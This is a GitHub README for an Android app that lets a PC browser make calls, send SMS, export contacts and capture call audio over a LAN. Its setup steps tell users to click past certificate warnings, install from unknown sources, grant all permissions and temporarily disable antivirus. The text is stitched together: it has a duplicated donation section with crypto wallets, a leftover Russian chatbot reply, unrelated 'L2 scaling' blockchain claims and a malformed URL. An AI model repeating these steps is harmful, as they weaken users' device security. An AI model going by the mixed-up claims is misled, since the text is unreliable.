# 📱 P2P Phone Call Gateway

> Control your Android phone from a PC browser — make calls, send SMS, listen to conversations and talk back — all over your local network. No cloud, no subscriptions, no middleman.

<p align="center">
  <img src="https://img.shields.io/badge/Android-5.0%2B-3DDC84?style=flat-square&logo=android&logoColor=white"/>
  <img src="https://img.shields.io/badge/Python-3.7%2B-3776AB?style=flat-square&logo=python&logoColor=white"/>
  <img src="https://img.shields.io/badge/WebSocket-RFC%206455-010101?style=flat-square"/>
  <img src="https://img.shields.io/badge/No%20Cloud-Local%20LAN-00E676?style=flat-square"/>
  <img src="https://img.shields.io/badge/Root-Optional-FF6B35?style=flat-square"/>
</p>

---

## 🆚 Two Versions

| | **gsvrk2** (Root) | **1pha4t** (No Root) |
|---|---|---|
| **Root required** | ✅ Yes (Magisk / SuperSU) | ❌ No |
| **Hear the caller** | ✅ Full duplex — both sides | ⚠️ Acoustic bridge — via speaker + mic |
| **Talk to caller** | ✅ Yes | ✅ Yes |
| **All other features** | ✅ Identical | ✅ Identical |
| **Download** | [`gsvrk2.zip`](gsvrk2.zip) | [`1pha4t.zip`](1pha4t.zip) |

> **Root version** uses `AudioRecord(VOICE_CALL)` to capture both sides of the call directly from the telephony stack.  
> **No-root version** uses the microphone to capture sound from the speakerphone — enable loudspeaker on the phone for best results.

---

## ✨ Features

- 📞 **Make & receive calls** from the browser — full dialer with numpad
- 🔢 **USSD codes** — `*100#`, `*101#` and any other codes work correctly
- 💬 **SMS** — read inbox, send messages from browser
- 👤 **Contacts** — full list with search, quick dial/SMS
- 📋 **Call history** — with quick redial
- 🎙 **Two-way audio** — hear the caller, talk back via PC microphone
- 📥 **Export** — download contacts, SMS, call log as **JSON** or **CSV** (opens in Excel/Sheets)
- 🌐 **Web UI** — clean dark interface, works in any browser (Chrome, Firefox, Edge)
- 🔒 **100% local** — direct WebSocket, no STUN/TURN/MQTT/cloud
- 📵 **Hang up, accept** incoming calls from browser
- 🔋 **Background service** — keeps running with screen off
- 📶 **Dual SIM** — select which SIM to use for outgoing calls

---

## 📸 Screenshots

<img width="350" alt="image" src="https://github.com/user-attachments/assets/901b0058-129c-46b9-96bd-a96c7ed3a4bc" /> <img width="350" alt="Снимок4" src="https://github.com/user-attachments/assets/4e05f623-a0fa-4648-b8a3-8b2f91e5cd0a" />
<img width="350" alt="Снимок2" src="https://github.com/user-attachments/assets/7d3cf449-ac4f-49e4-bca0-ee766cfd9a51" /> <img width="350" alt="Снимок1" src="https://github.com/user-attachments/assets/5387a65b-f5a1-43ae-a5e3-da648f5af0f6" />
<img width="350" alt="Снимок3" src="https://github.com/user-attachments/assets/4fde1380-490f-4724-8e45-401588ede380" /> <img width="250" alt="Снимок" src="https://github.com/user-attachments/assets/7dd95eff-59b2-4a91-aab6-59e7c8380830" />
<img width="180" alt="Screenshot 1" src="https://github.com/user-attachments/assets/48e2e0f6-a065-4f97-95b4-c4b0c728911b" /> | <img width="180" alt="Screenshot 2" src="https://github.com/user-attachments/assets/d81b10fb-3aad-433c-ab4f-5087e774baed" /> | <img width="180" alt="Screenshot 3" src="https://github.com/user-attachments/assets/e53786f9-3692-4cc6-bc00-e5cc9cb3bd79" /> |

---

## 🚀 About the Project
This is a fully **open-source** peer-to-peer (P2P) voice call gateway that bridges mobile networks and decentralized L2 environments.

* **VoIP Optimized:** Built using `VOICE_COMMUNICATION` stream handling to leverage hardware acoustic echo cancellation without requiring Root privileges.
* **Media-Layer Routing:** Audio output utilizes `USAGE_MEDIA` and `STREAM_MUSIC` to bypass native Telephony Stack restrictions, ensuring clean P2P audio delivery.
* **Dynamic Audio Management:** Features an automated lifecycle that configures the Android audio manager state to `MODE_NORMAL`, activates the speakerphone, and maximizes volume automatically during an active stream.

---

## 💻 Installation & Startup Guide (PC / Server)

### Step 1: Download the Project
1. Go to the top of this GitHub repository: https://github.com
2. Click on the **Code** button and select **Download ZIP** (or extract the pre-packaged archive from the repository).
3. Unpack the downloaded archive to a convenient directory on your PC.

### Step 2: Run the Server
1. Navigate to the **`server`** folder inside the extracted project directory.
2. Run the Python server script (`server.py`).
3. This action will spin up the local gateway environment and automatically open your default web browser.

### Step 3: Access the Interface
1. If the browser does not open automatically, manually navigate to:
   ```text
   https://192.168.1
   ```
2. **Bypassing the Security Warning:** Since the server uses a self-signed local SSL certificate for secure P2P media access, your browser will display a *"Connection is not secure"* or *"Your connection is not private"* warning.
3. Click on **Advanced** (Дополнительно) and choose **Proceed / Continue** (Перейти/Продолжить) to safely open the control interface.

---

## 💝 Support the Project (Donations)

If you find this open-source P2P gateway useful and want to support its further development, L2 infrastructure scaling, and maintenance, you can send a donation to the following verified addresses:

* **EVM Networks (Ethereum, Base, Linea, Arbitrum, etc.):**
  `0x79CBd4dB2a470e44C04c241a25cE64cA9491A3A7`
* **Bitcoin (BTC):**
  `bc1q2v3afsm0mh3nhex6e0vhel3cje0677vwd42sty`
* **Solana (SOL):**
  `B5dbcL9Afb2cZhUh4AUud76aLwMoPqhzP9TRC7rN3Q5Z`

Thank you for supporting open-source decentralized software! 🙏
Используйте код с осторожностью.Потребуются ли еще какие-то изменения в тексте или инструкциях, прежде чем вы обновите репозиторий?
---

## 🏗 How It Works

```
┌──────────────────────────┐         WebSocket (LAN)        ┌──────────────────────────┐
│      PC Browser          │ ◄──────────────────────────── │   Android Phone          │
│                          │                                 │                          │
│  client.html             │   JSON commands (dial, SMS…)   │  PhoneGatewayService     │
│  ─────────────           │ ──────────────────────────────►│  ─────────────────────   │
│  WebSocket client        │                                 │  TelecomController       │
│  Web Audio API           │   PCM audio frames (binary)    │  AudioRecord / AudioTrack│
│  MediaDevices (mic)      │ ◄──────────────────────────── │                          │
└──────────────────────────┘                                 └──────────────────────────┘
                                     server.py
                              (relay on your PC)
```

`server.py` runs on your PC and acts as a local relay between the browser and the Android app.

---

## 🚀 Installation

### Step 1 — PC (Server)

**Requirements:** Python 3.7+

```bash
# 1. Extract the ZIP
unzip gsvrk2.zip   # or 1pha4t.zip

# 2. Go to server folder
cd remote-phone/server

# 3. Install dependency
pip install websockets

# 4. Run
python server.py
```

The terminal will show:
```
Server started on ws://0.0.0.0:8765
Your IP: 192.168.1.105
Open client.html in your browser
```

Open `client.html` in your browser (double-click the file, or drag it into Chrome).

---

### Step 2 — Android (APK)

#### Download ready APK

Go to the **[Releases](https://github.com/neyro-droid/P2P-PHONE-Call-Gateway/releases)** tab and download:
- `app-root.apk` — for rooted devices
- `app-noroot.apk` — for non-rooted devices

#### Install on phone

1. On your Android phone, go to **Settings → Security → Install from unknown sources** and enable it (or allow it for your file manager)
2. Copy the APK to your phone and tap it to install
3. Grant all requested permissions (calls, SMS, contacts, microphone)

#### First launch

1. Open the **P2P Gateway** app on your phone
2. The app will request **root access** (root version only) — tap **Allow** in the Magisk popup
3. Enter the **IP address** of your PC and port `8765`
4. Tap **▶ Start**

---

### Step 3 — Connect

1. In the browser, enter the **PC IP** shown by `server.py` (e.g. `192.168.1.105`)
2. Click **🔗 Connect**
3. Allow microphone access when the browser asks
4. The status indicator turns **green** → phone is connected

You're ready. Make a call from the browser dialer.

---

## 🔧 Build from Source

**Requirements:** Android Studio, JDK 17, Python 3.7+

```bash
# Clone
git clone https://github.com/neyro-droid/P2P-PHONE-Call-Gateway
cd P2P-PHONE-Call-Gateway

# Build root version
cd gsvrk2/remote-phone/android
./gradlew assembleDebug

# APK will be at:
# app/build/outputs/apk/debug/app-debug.apk

# Run server
cd ../server
python server.py
```

---

## 🎤 Audio — What to Expect

### Root version (`gsvrk2`)

- App automatically runs `pm grant … CAPTURE_AUDIO_OUTPUT` via `su`
- `AudioRecord(VOICE_CALL)` captures **both sides** of the call directly from the telephony pipeline
- You hear the caller **clearly** in the browser, the caller hears **your PC microphone**

### No-root version (`1pha4t`)

- Uses `AudioRecord(UNPROCESSED)` — raw microphone, no AEC/NS filters
- **Enable loudspeaker** on the phone during the call — the microphone will pick up the caller's voice
- The caller hears your PC microphone
- Works well in a quiet room

---

## 📥 Export Data

In the browser, open any tab and click the download buttons:

| Tab | Formats |
|-----|---------|
| 📋 Call History | JSON · CSV · All-in-one |
| 👤 Contacts | JSON · CSV |
| 💬 SMS | JSON · CSV |

CSV files open directly in Microsoft Excel and Google Sheets.

---

## ⚙️ Requirements

| Component | Requirement |
|-----------|-------------|
| Android | 5.0+ (API 21) |
| Root (root version) | Magisk 20+ or SuperSU |
| Python | 3.7+ |
| Browser | Chrome 90+ / Firefox 88+ / Edge 90+ |
| Network | Phone and PC on the same Wi-Fi / LAN |

---

## 🔒 Permissions

The Android app requests the following permissions:

| Permission | Why |
|-----------|-----|
| `CALL_PHONE` | Make outgoing calls |
| `READ_PHONE_STATE` | Detect incoming calls |
| `RECORD_AUDIO` | Capture call audio |
| `READ/SEND_SMS` | Read and send SMS |
| `READ_CONTACTS` | Show contacts list |
| `READ_CALL_LOG` | Show call history |
| `INTERNET` | WebSocket connection to PC |

---

## ❓ Troubleshooting

**Phone not connecting**
- Make sure phone and PC are on the **same Wi-Fi network**
- Check that `server.py` is running and not blocked by a firewall
- Try disabling Windows Defender / antivirus temporarily

**No audio from caller (no-root)**
- Enable **loudspeaker** on the phone during the call
- The microphone will pick up the caller through the speaker

**Root not granted**
- Make sure Magisk / SuperSU is installed and working
- Tap **Allow** in the root permission popup when the app first starts

**USSD not showing result (`*100#`)**
- The USSD result appears in a system popup **on the phone**
- This is normal — Android shows USSD responses in the system dialer

**Call UI frozen after hang up**
- This is fixed in both versions — UI resets immediately on disconnect

---

## 📁 Repository Structure

```
P2P-PHONE-Call-Gateway/
├── gsvrk2/                    # Root version (source)
│   └── remote-phone/
│       ├── android/           # Android app (Kotlin)
│       └── server/
│           ├── server.py      # PC relay server
│           └── client.html    # Web UI
├── 1pha4t/                    # No-root version (source)
│   └── remote-phone/
│       ├── android/
│       └── server/
├── gsvrk2.zip                 # Root version (ready to use)
└── 1pha4t.zip                 # No-root version (ready to use)
```

---

## 📄 License

MIT License — free to use, modify, and distribute.

---

<p align="center">Made with ❤️ — no cloud, no tracking, just your phone and your browser</p>
## 💝 Support the Project (Donations)

If you find this open-source P2P gateway useful and want to support its further development, L2 infrastructure scaling, and maintenance, you can send a donation to the following verified addresses:

* **EVM Networks (Ethereum, Base, Linea, Arbitrum, etc.):**
  `0x79CBd4dB2a470e44C04c241a25cE64cA9491A3A7`
* **Bitcoin (BTC):**
  `bc1q2v3afsm0mh3nhex6e0vhel3cje0677vwd42sty`
* **Solana (SOL):**
  `B5dbcL9Afb2cZhUh4AUud76aLwMoPqhzP9TRC7rN3Q5Z`

Thank you for supporting open-source decentralized software! 🙏

<img width="1503" height="1157" alt="Снимок4" src="https://github.com/user-attachments/assets/4e05f623-a0fa-4648-b8a3-8b2f91e5cd0a" />
<img width="988" height="517" alt="Снимок3" src="https://github.com/user-attachments/assets/4fde1380-490f-4724-8e45-401588ede380" />
<img width="1513" height="1161" alt="Снимок2" src="https://github.com/user-attachments/assets/7d3cf449-ac4f-49e4-bca0-ee766cfd9a51" />
<img width="1506" height="1154" alt="Снимок1" src="https://github.com/user-attachments/assets/5387a65b-f5a1-43ae-a5e3-da648f5af0f6" />
<img width="749" height="682" alt="Снимок" src="https://github.com/user-attachments/assets/7dd95eff-59b2-4a91-aab6-59e7c8380830" />
<img width="1220" height="2712" alt="Screenshot_2026-05-22-21-39-40-381_com remotephone" src="https://github.com/user-attachments/assets/e53786f9-3692-4cc6-bc00-e5cc9cb3bd79" />
<img width="1220" height="2712" alt="Screenshot_2026-05-22-21-39-35-814_com remotephone" src="https://github.com/user-attachments/assets/d81b10fb-3aad-433c-ab4f-5087e774baed" />
<img width="1220" height="2712" alt="Screenshot_2026-05-22-21-39-26-136_com remotephone" src="https://github.com/user-attachments/assets/48e2e0f6-a065-4f97-95b4-c4b0c728911b" />
# P2P-PHONE-Call-Gateway
# Decentralized Infrastructure Node L2 Scaling solution for Base &amp; Linea networks.
<img width="1511" height="1160" alt="image" src="https://github.com/user-attachments/assets/901b0058-129c-46b9-96bd-a96c7ed3a4bc" />
